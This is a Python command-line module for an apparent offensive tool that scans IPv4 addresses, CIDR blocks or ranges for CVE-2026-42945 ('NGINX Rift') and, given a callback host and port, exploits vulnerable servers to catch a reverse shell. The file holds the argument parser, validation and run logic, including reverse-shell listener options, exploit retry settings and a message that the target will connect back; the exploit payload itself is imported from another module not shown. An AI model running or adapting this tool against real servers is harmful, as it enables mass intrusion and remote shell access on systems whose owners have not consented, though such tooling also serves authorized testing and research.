"""Command-line interface."""

from __future__ import annotations

import argparse
import sys

from scanner.constants import DEFAULT_PORTS
from scanner.engine import Scanner
from scanner.exploit import format_scan_command
from scanner.models import ScanConfig
from scanner.targets import parse_ports, validate_listen_host


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Scan for CVE-2026-42945 (NGINX Rift) and catch a reverse shell if exploitable.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Usage:\n"
            "  python3 scan.py <target> --listen-ip <host> --listen-port <port>\n"
            "\n"
            "Target: single IP, CIDR (10.0.0.0/24), or range (10.0.0.1-10.0.0.50)\n"
            "\n"
            "Examples:\n"
            "  python3 scan.py 127.0.0.1 --listen-ip host.docker.internal --listen-port 4444\n"
            "  python3 scan.py 10.0.0.0/24 --listen-ip 172.17.0.1 --listen-port 1337 --ports 19321\n"
            "\n"
            "Fingerprint-only (no exploit):\n"
            "  python3 scan.py 10.0.0.0/24 -o report.json\n"
        ),
    )
    parser.add_argument(
        "target",
        metavar="target",
        help="IPv4 target: single IP, CIDR, or start-end range",
    )
    parser.add_argument(
        "--listen-ip",
        "--lhost",
        metavar="HOST",
        help="Your callback host (IPv4 or hostname, e.g. host.docker.internal)",
    )
    parser.add_argument(
        "--listen-port",
        "--lport",
        metavar="PORT",
        type=int,
        help="Your callback port for reverse shell",
    )
    parser.add_argument(
        "--ports",
        default=",".join(str(p) for p in DEFAULT_PORTS),
        help=f"Ports to scan (default: {','.join(map(str, DEFAULT_PORTS))})",
    )
    parser.add_argument(
        "--exploit-port",
        type=int,
        default=None,
        help="Nginx exploit port if different from scanned port (lab: 19321)",
    )
    parser.add_argument("--probe-path", metavar="PATH", help="URI prefix for + expansion probe")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--connect-timeout", type=float, default=3.0)
    parser.add_argument("--read-timeout", type=float, default=5.0)
    parser.add_argument("-o", "--output", default="scan_report.json")
    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument("--exploit-tries", type=int, default=5)
    parser.add_argument("--exploit-max-offsets", type=int, default=5)
    parser.add_argument("--shell-wait", type=float, default=12.0)
    return parser


def validate_args(args: argparse.Namespace) -> None:
    has_ip = args.listen_ip is not None
    has_port = args.listen_port is not None

    if has_ip ^ has_port:
        raise ValueError("--listen-ip and --listen-port must be used together")

    if has_ip and has_port:
        if not 1 <= args.listen_port <= 65535:
            raise ValueError(f"listen port out of range: {args.listen_port}")
        args.listen_ip = validate_listen_host(args.listen_ip)
        args.validate_shell = True
        args.interactive_shell = True
        args.validate_all_open = True
    else:
        args.validate_shell = False
        args.interactive_shell = False
        args.validate_all_open = False
        args.listen_ip = ""
        args.listen_port = 0


def config_from_args(args: argparse.Namespace) -> ScanConfig:
    return ScanConfig(
        ip_range=args.target,
        ports=parse_ports(args.ports),
        threads=args.threads,
        connect_timeout=args.connect_timeout,
        read_timeout=args.read_timeout,
        probe_path=args.probe_path,
        output=args.output,
        quiet=args.quiet,
        validate_shell=args.validate_shell,
        interactive_shell=args.interactive_shell,
        listen_ip=args.listen_ip,
        listen_port=args.listen_port,
        exploit_port=args.exploit_port,
        exploit_tries=args.exploit_tries,
        exploit_max_offsets=args.exploit_max_offsets,
        shell_wait=args.shell_wait,
        validate_all_open=args.validate_all_open,
    )


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if args.threads < 1:
        print("[!] --threads must be >= 1", file=sys.stderr)
        return 2

    try:
        validate_args(args)
        config = config_from_args(args)
    except ValueError as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 2

    if config.validate_shell and not config.quiet:
        print(format_scan_command(config.ip_range, config.listen_ip, config.listen_port))
        print(
            f"[*] Listening on 0.0.0.0:{config.listen_port} "
            f"— target will connect to {config.listen_ip}:{config.listen_port}\n"
        )

    try:
        scanner = Scanner(config)
        scanner.run()
        scanner.write_report()
    except OSError as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 2

    if not config.quiet:
        print(f"\n[*] Summary: {scanner.summarize()}")
        print(f"[+] Report written to {config.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
